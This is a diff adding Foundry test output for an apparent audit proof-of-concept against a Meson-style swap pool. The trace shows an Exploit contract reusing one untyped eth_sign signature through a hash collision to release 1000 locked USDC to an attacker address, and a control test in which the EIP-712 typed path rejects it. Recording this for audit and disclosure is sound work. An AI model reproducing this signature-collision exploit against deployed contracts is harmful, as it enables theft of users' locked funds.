@@ -1,0 +1,198 @@
+No files changed, compilation skipped
+
+Ran 2 tests for test/18099-hash-collisions-in-untyped-signatures-trailofbits-meson-prot_exp.sol:Finding18099Test
+[PASS] test_control_typed_domain_rejects_the_same_signature() (gas: 2134644)
+Traces:
+  [2134644] Finding18099Test::test_control_typed_domain_rejects_the_same_signature()
+    ├─ [1860382] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─ [264879] → new MesonUSDC@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   └─ ← [Return] 990 bytes of code
+    │   ├─ [638394] → new MesonPool@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   └─ ← [Return] 3077 bytes of code
+    │   └─ ← [Return] 3329 bytes of code
+    ├─ [2271] Exploit::pool() [staticcall]
+    │   └─ ← [Return] MesonPool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]
+    ├─ [2544] Exploit::token() [staticcall]
+    │   └─ ← [Return] MesonUSDC: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [290] Exploit::LOCKED() [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [49242] MesonPool::fund(1000000000 [1e9])
+    │   ├─ [22488] MesonUSDC::mint(MesonPool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 1000000000 [1e9])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [410] Exploit::SWAP2() [staticcall]
+    │   └─ ← [Return] 452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74]
+    ├─ [403] Exploit::INITIATOR() [staticcall]
+    │   └─ ← [Return] 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
+    ├─ [111097] MesonPool::lock(452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74], 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266)
+    │   └─ ← [Stop]
+    ├─ [410] Exploit::SWAP2() [staticcall]
+    │   └─ ← [Return] 452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74]
+    ├─ [202] Exploit::SIG_V() [staticcall]
+    │   └─ ← [Return] 28
+    ├─ [359] Exploit::SIG_R() [staticcall]
+    │   └─ ← [Return] 0x3e1ef19d3591c5b84abfabf150e7d4d373b81148f3cec41b0942e0f80d7af813
+    ├─ [246] Exploit::SIG_S() [staticcall]
+    │   └─ ← [Return] 0x66c53eed064f790bcc5a60ea1e6f2c1bb664a23876927f271c858d35aa0c96aa
+    ├─ [6841] MesonPool::releaseTyped(452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74], 0x1111111111111111111111111111111111111111, 28, 0x3e1ef19d3591c5b84abfabf150e7d4d373b81148f3cec41b0942e0f80d7af813, 0x66c53eed064f790bcc5a60ea1e6f2c1bb664a23876927f271c858d35aa0c96aa) [staticcall]
+    │   ├─ [3000] PRECOMPILES::ecrecover(0x757078f2826c8ba47467b9c49de68081077888ca1cb6912bbd043adf00a08781, 28, 28098069583328589599807512559233141700785855215831028959319226084849549506579, 46484413725699941435244059597421380805623892702427639745028546108025761207978) [staticcall]
+    │   │   └─ ← [Return] 0xda4Ee892A352aF486C286bcA64091534243C1cc9
+    │   └─ ← [Return] false
+    ├─ [0] VM::assertFalse(false, "EIP-712 release accepted the untyped signature") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2464] MesonUSDC::balanceOf(0x1111111111111111111111111111111111111111) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "attacker was paid on the typed path") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2464] MesonUSDC::balanceOf(MesonPool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [290] Exploit::LOCKED() [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [0] VM::assertEq(1000000000 [1e9], 1000000000 [1e9], "locked 1000 USDC stayed in the pool") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2606] MesonPool::locked() [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true, "swap still locked") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+[PASS] test_exploit_one_signature_releases_a_different_swap() (gas: 2202020)
+Traces:
+  [2240986] Finding18099Test::test_exploit_one_signature_releases_a_different_swap()
+    ├─ [1860382] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─ [264879] → new MesonUSDC@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   └─ ← [Return] 990 bytes of code
+    │   ├─ [638394] → new MesonPool@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   └─ ← [Return] 3077 bytes of code
+    │   └─ ← [Return] 3329 bytes of code
+    ├─ [194834] Exploit::run()
+    │   ├─ [28014] MesonPool::fund(1000000000 [1e9])
+    │   │   ├─ [22488] MesonUSDC::mint(MesonPool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 1000000000 [1e9])
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   ├─ [89333] MesonPool::lock(452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74], 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266)
+    │   │   └─ ← [Stop]
+    │   ├─ [4137] MesonPool::checkRequest(477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74], 28, 0x3e1ef19d3591c5b84abfabf150e7d4d373b81148f3cec41b0942e0f80d7af813, 0x66c53eed064f790bcc5a60ea1e6f2c1bb664a23876927f271c858d35aa0c96aa, 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266) [staticcall]
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0x03881d817c4bb80041d67d8105a77c1fc9227664064ea8523099f7801f1c654e, 28, 28098069583328589599807512559233141700785855215831028959319226084849549506579, 46484413725699941435244059597421380805623892702427639745028546108025761207978) [staticcall]
+    │   │   │   └─ ← [Return] 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
+    │   │   └─ ← [Return] true
+    │   ├─ [28396] MesonPool::release(452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74], 0x1111111111111111111111111111111111111111, 28, 0x3e1ef19d3591c5b84abfabf150e7d4d373b81148f3cec41b0942e0f80d7af813, 0x66c53eed064f790bcc5a60ea1e6f2c1bb664a23876927f271c858d35aa0c96aa)
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0x03881d817c4bb80041d67d8105a77c1fc9227664064ea8523099f7801f1c654e, 28, 28098069583328589599807512559233141700785855215831028959319226084849549506579, 46484413725699941435244059597421380805623892702427639745028546108025761207978) [staticcall]
+    │   │   │   └─ ← [Return] 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
+    │   │   ├─ [22881] MesonUSDC::transfer(0x1111111111111111111111111111111111111111, 1000000000 [1e9])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] 1000000000 [1e9]
+    │   ├─ [4841] MesonPool::releaseTyped(452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74], 0x1111111111111111111111111111111111111111, 28, 0x3e1ef19d3591c5b84abfabf150e7d4d373b81148f3cec41b0942e0f80d7af813, 0x66c53eed064f790bcc5a60ea1e6f2c1bb664a23876927f271c858d35aa0c96aa) [staticcall]
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0x757078f2826c8ba47467b9c49de68081077888ca1cb6912bbd043adf00a08781, 28, 28098069583328589599807512559233141700785855215831028959319226084849549506579, 46484413725699941435244059597421380805623892702427639745028546108025761207978) [staticcall]
+    │   │   │   └─ ← [Return] 0xda4Ee892A352aF486C286bcA64091534243C1cc9
+    │   │   └─ ← [Return] false
+    │   ├─ [464] MesonUSDC::balanceOf(0x1111111111111111111111111111111111111111) [staticcall]
+    │   │   └─ ← [Return] 1000000000 [1e9]
+    │   ├─ [2464] MesonUSDC::balanceOf(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [464] MesonUSDC::balanceOf(MesonPool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [533] MesonPool::amountOf(477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74]) [staticcall]
+    │   │   └─ ← [Return] 61063167274 [6.106e10]
+    │   ├─ [648] MesonPool::netOf(477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74]) [staticcall]
+    │   │   └─ ← [Return] 461499071 [4.614e8]
+    │   ├─ [218] MesonPool::outTokenOf(477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74]) [staticcall]
+    │   │   └─ ← [Return] 9
+    │   ├─ [533] MesonPool::amountOf(452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74]) [staticcall]
+    │   │   └─ ← [Return] 1000000000 [1e9]
+    │   ├─ [218] MesonPool::outTokenOf(452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74]) [staticcall]
+    │   │   └─ ← [Return] 1
+    │   └─ ← [Return]
+    ├─ [2544] Exploit::token() [staticcall]
+    │   └─ ← [Return] MesonUSDC: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [2271] Exploit::pool() [staticcall]
+    │   └─ ← [Return] MesonPool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]
+    ├─ [2464] MesonUSDC::balanceOf(0x1111111111111111111111111111111111111111) [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [290] Exploit::LOCKED() [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [0] VM::assertEq(1000000000 [1e9], 1000000000 [1e9], "attacker received the locked USDC") [staticcall]
+    │   └─ ← [Return]
+    ├─ [403] Exploit::INITIATOR() [staticcall]
+    │   └─ ← [Return] 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
+    ├─ [2464] MesonUSDC::balanceOf(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "signer received nothing") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2464] MesonUSDC::balanceOf(MesonPool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "pool emptied") [staticcall]
+    │   └─ ← [Return]
+    ├─ [290] Exploit::LOCKED() [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [0] VM::assertEq(1000000000 [1e9], 1000000000 [1e9], "1000 USDC released") [staticcall]
+    │   └─ ← [Return]
+    ├─ [297] Exploit::SWAP1() [staticcall]
+    │   └─ ← [Return] 477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74]
+    ├─ [533] MesonPool::amountOf(477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74]) [staticcall]
+    │   └─ ← [Return] 61063167274 [6.106e10]
+    ├─ [0] VM::assertEq(61063167274 [6.106e10], 61063167274 [6.106e10], "signed amount") [staticcall]
+    │   └─ ← [Return]
+    ├─ [297] Exploit::SWAP1() [staticcall]
+    │   └─ ← [Return] 477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74]
+    ├─ [419] MesonPool::feeOf(477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74]) [staticcall]
+    │   └─ ← [Return] 60601668203 [6.06e10]
+    ├─ [0] VM::assertEq(60601668203 [6.06e10], 60601668203 [6.06e10], "signed fee") [staticcall]
+    │   └─ ← [Return]
+    ├─ [297] Exploit::SWAP1() [staticcall]
+    │   └─ ← [Return] 477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74]
+    ├─ [648] MesonPool::netOf(477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74]) [staticcall]
+    │   └─ ← [Return] 461499071 [4.614e8]
+    ├─ [0] VM::assertEq(461499071 [4.614e8], 461499071 [4.614e8], "signed net") [staticcall]
+    │   └─ ← [Return]
+    ├─ [297] Exploit::SWAP1() [staticcall]
+    │   └─ ← [Return] 477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74]
+    ├─ [218] MesonPool::outTokenOf(477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74]) [staticcall]
+    │   └─ ← [Return] 9
+    ├─ [0] VM::assertEq(9, 9, "signed out-token") [staticcall]
+    │   └─ ← [Return]
+    ├─ [410] Exploit::SWAP2() [staticcall]
+    │   └─ ← [Return] 452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74]
+    ├─ [533] MesonPool::amountOf(452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74]) [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [0] VM::assertEq(1000000000 [1e9], 1000000000 [1e9], "released amount") [staticcall]
+    │   └─ ← [Return]
+    ├─ [410] Exploit::SWAP2() [staticcall]
+    │   └─ ← [Return] 452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74]
+    ├─ [218] MesonPool::outTokenOf(452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74]) [staticcall]
+    │   └─ ← [Return] 1
+    ├─ [0] VM::assertEq(1, 1, "released out-token") [staticcall]
+    │   └─ ← [Return]
+    ├─ [297] Exploit::SWAP1() [staticcall]
+    │   └─ ← [Return] 477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74]
+    ├─ [533] MesonPool::amountOf(477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74]) [staticcall]
+    │   └─ ← [Return] 61063167274 [6.106e10]
+    ├─ [410] Exploit::SWAP2() [staticcall]
+    │   └─ ← [Return] 452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74]
+    ├─ [533] MesonPool::amountOf(452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74]) [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [0] VM::assertTrue(true, "amounts differ") [staticcall]
+    │   └─ ← [Return]
+    ├─ [297] Exploit::SWAP1() [staticcall]
+    │   └─ ← [Return] 477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74]
+    ├─ [410] Exploit::SWAP2() [staticcall]
+    │   └─ ← [Return] 452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74]
+    ├─ [0] VM::assertEq(477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74], 477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74], "swap1 = keccak256(swap2, attacker)") [staticcall]
+    │   └─ ← [Return]
+    ├─ [297] Exploit::SWAP1() [staticcall]
+    │   └─ ← [Return] 477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74]
+    ├─ [658] MesonPool::requestDigest(477432778591793354069344411157512953690690978308868251893081715035611537153 [4.774e74]) [staticcall]
+    │   └─ ← [Return] 0x03881d817c4bb80041d67d8105a77c1fc9227664064ea8523099f7801f1c654e
+    ├─ [410] Exploit::SWAP2() [staticcall]
+    │   └─ ← [Return] 452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74]
+    ├─ [833] MesonPool::releaseDigest(452724224722609545388216974430997457137178498488074784860803615227195177985 [4.527e74], 0x1111111111111111111111111111111111111111) [staticcall]
+    │   └─ ← [Return] 0x03881d817c4bb80041d67d8105a77c1fc9227664064ea8523099f7801f1c654e
+    ├─ [0] VM::assertEq(0x03881d817c4bb80041d67d8105a77c1fc9227664064ea8523099f7801f1c654e, 0x03881d817c4bb80041d67d8105a77c1fc9227664064ea8523099f7801f1c654e, "one eth_sign digest covers both layouts") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(0x19457468657265756d205369676e6564204d6573736167653a0a333200000000, 0x19457468657265756d205369676e6564204d6573736167653a0a333200000000, "prefix") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 15.89ms (18.26ms CPU time)
+
+Ran 1 test suite in 67.22ms (15.89ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
